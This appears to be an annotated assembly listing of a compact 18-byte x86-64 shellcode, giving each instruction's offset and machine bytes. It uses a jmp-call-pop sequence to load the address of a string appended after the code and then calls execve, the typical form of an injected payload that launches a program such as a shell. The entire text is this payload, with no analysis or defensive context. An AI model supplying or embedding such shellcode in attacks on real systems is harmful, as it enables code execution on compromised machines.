.arch x86
.bits 64

; total: 18 bytes

jmp 0xd         ; 0x00000000   2          eb0b
pop rdi         ; 0x00000002   1            5f
xor rdx, rdx    ; 0x00000003   3        4831d2
push rdx        ; 0x00000006   1            52
pop rsi         ; 0x00000007   1            5e
push 0x3b       ; 0x00000008   2          6a3b  ; __NR_execve
pop rax         ; 0x0000000a   1            58
syscall         ; 0x0000000b   2          0f05
call 2          ; 0x0000000d   5    e8f0ffffff